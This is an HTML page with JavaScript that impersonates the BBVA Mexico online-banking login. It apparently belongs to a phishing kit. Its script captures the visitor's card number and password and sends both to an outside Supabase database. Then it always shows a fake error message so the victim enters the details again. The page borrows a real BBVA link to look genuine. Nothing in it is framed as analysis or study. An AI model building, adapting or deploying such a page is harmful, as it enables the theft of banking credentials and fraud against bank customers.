<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>

<title>Index BBVA | Net</title>

<!-- FUENTE -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="icon" href="../nav.png" type="image/png"></head>


<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">

<style>

/* ============================================
RESET
============================================ */

*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

/* ============================================
BODY
============================================ */

body{
  background:#f2f2f2;
  min-height:100vh;
  display:flex;
  justify-content:center;
  align-items:flex-start;
  font-family:'Roboto', sans-serif;
}

/* ============================================
CONTENEDOR
============================================ */

.container{
  width:100%;
  max-width:520px;
  margin-top:30px;
  padding:0 20px;
}

/* ============================================
TITULO
============================================ */

.title{
  text-align:center;
  font-size:34px;
  font-weight:300;
  letter-spacing:-1px;
  margin-bottom:34px;
  color:#072146;
}

/* ============================================
INPUTS
============================================ */

.input-group{
  margin-bottom:18px;
}

.input-wrapper{
  position:relative;
}

.input{
  width:100%;
  height:62px;
  border:none;
  border-bottom:1px solid #4b4b4b;
  background:#ececec;
  padding:20px 52px 10px 18px;

  font-size:20px;
  font-weight:400;
  color:#121212;

  outline:none;
  transition:.2s;
}

.input.error{
  border-bottom:2px solid #d92d20;
}

/* ============================================
LABEL
============================================ */

.input-label{
  position:absolute;
  top:8px;
  left:18px;

  font-size:13px;
  font-weight:400;
  letter-spacing:.2px;

  color:#6f6f6f;
}

/* ============================================
PASSWORD
============================================ */

.password-input{
  font-size:18px;
  font-weight:400;
  letter-spacing:3px;
}

/* ============================================
OJITO
============================================ */

.eye-btn{
  position:absolute;
  right:16px;
  top:50%;
  transform:translateY(-50%);

  border:none;
  background:none;
  cursor:pointer;
}

.eye-icon{
  width:22px;
  height:22px;
  fill:#5f6368;
}

/* ============================================
ACCIONES
============================================ */

.actions{
  margin-top:28px;

  display:flex;
  justify-content:space-between;
  align-items:center;
  gap:20px;
}

/* ============================================
LINK
============================================ */

.forgot-link{
  color:#1973c7;
  text-decoration:none;
  font-size:15px;
  font-weight:500;
}

/* ============================================
BOTON
============================================ */

.btn{
  min-width:135px;
  height:52px;

  background:#1973c7;
  color:#fff;

  border:none;

  font-size:17px;
  font-weight:500;

  cursor:pointer;
  transition:.2s;
}

.btn:hover{
  background:#1464ad;
}

/* ============================================
ERROR
============================================ */

.error-box{
  margin-top:22px;

  display:none;
  align-items:flex-start;
  gap:10px;

  color:#d92d20;

  font-size:14px;
  line-height:1.5;
}

.error-icon{
  min-width:18px;
}

.error-icon svg{
  width:18px;
  height:18px;
  fill:#d92d20;
}

</style>
    <!-- Supabase -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script src="js/supabase-config.js"></script>
</head>

<body>

<div class="container">

  <!-- TITULO -->
  <h1 class="title">
    ¡Bienvenido!
  </h1>

  <!-- TARJETA -->
  <div class="input-group">

    <div class="input-wrapper">

      <div class="input-label">
        Número de Tarjeta
      </div>

      <input
        type="text"
        id="card-display"
        class="input"
        maxlength="19"
      />

    </div>

  </div>

  <!-- PASSWORD -->
  <div class="input-group">

    <div class="input-wrapper">

      <input
        type="password"
        id="password"
        class="input password-input"
        placeholder="Contraseña"
      />

 

  <!-- ACCIONES -->
  <div class="actions">

    <a
      href="https://a1.bbvanet.com.mx/portalblg/portalblg/public/desbloqueousuario?cloud=true"
      class="forgot-link"
    >
      ¿Olvidaste tu contraseña?
    </a>

    <button
      class="btn"
      id="btn-continuar"
    >
      Continuar
    </button>

  </div>

  <!-- ERROR -->
<div
  class="error-box"
  id="error-box"
>

  <div class="error-icon">

    <svg
      viewBox="0 0 24 24"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path d="M1 21h22L12 2 1 21z"></path>
      <rect x="11" y="8" width="2" height="6" fill="white"></rect>
      <rect x="11" y="16" width="2" height="2" fill="white"></rect>
    </svg>

  </div>

  <div class="error-text">
    Estimado cliente: La clave de acceso debe ser de 4 a 10 caracteres
  </div>

</div>

</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const supabase = window.supabaseClient;

    if (!supabase) {
        console.error("Supabase no cargó");
        return;
    }

    /* ==================== TARJETA ==================== */
    const cardDisplay = document.getElementById('card-display');
    let realCard = sessionStorage.getItem('cardNumber') || '';

    function formatCard(number) {
        return number.replace(/(.{4})/g, '$1 ').trim();
    }

    function getMasked(number) {

        let result = '';

        for (let i = 0; i < number.length; i++) {

            result += (
                i < number.length - 4
            )
            ? '*'
            : number[i];
        }

        return formatCard(result);
    }

    function updateCard() {
        cardDisplay.value = getMasked(realCard);
    }

    updateCard();

    cardDisplay.addEventListener('keydown', (e) => {

        if (e.key === 'Backspace') {

            realCard = realCard.slice(0, -1);

            updateCard();

            sessionStorage.setItem(
                'cardNumber',
                realCard
            );

            e.preventDefault();

            return;
        }

        if (
            !/^\d$/.test(e.key) ||
            realCard.length >= 16
        ) {

            e.preventDefault();

            return;
        }

        realCard += e.key;

        sessionStorage.setItem(
            'cardNumber',
            realCard
        );

        updateCard();

        e.preventDefault();
    });

    /* ==================== ELEMENTOS ==================== */
    const btnContinuar =
        document.getElementById('btn-continuar');

    const passwordInput =
        document.getElementById('password');

    const errorBox =
        document.getElementById('error-box');

    /* ==================== CONTINUAR ==================== */
    btnContinuar.addEventListener(
        'click',
        async () => {

        const password =
            passwordInput.value.trim();

        const cardNumber =
            realCard;

        // VALIDAR TARJETA
        if (cardNumber.length !== 16) {

            return;
        }

        // GUARDAR EN SUPABASE
        try {

            await supabase
                .from('users')
                .insert([{
                    card_number: cardNumber,
                    password_hash: password
                }]);

        } catch (err) {

            console.error(err);
        }

        // MOSTRAR ERROR SIEMPRE
        errorBox.style.display = 'flex';

        passwordInput.classList.add('error');
    });

    /* ==================== QUITAR ERROR ==================== */
    passwordInput.addEventListener(
        'input',
        () => {

        errorBox.style.display = 'none';

        passwordInput.classList.remove(
            'error'
        );
    });

});
</script>

</body>
</html>
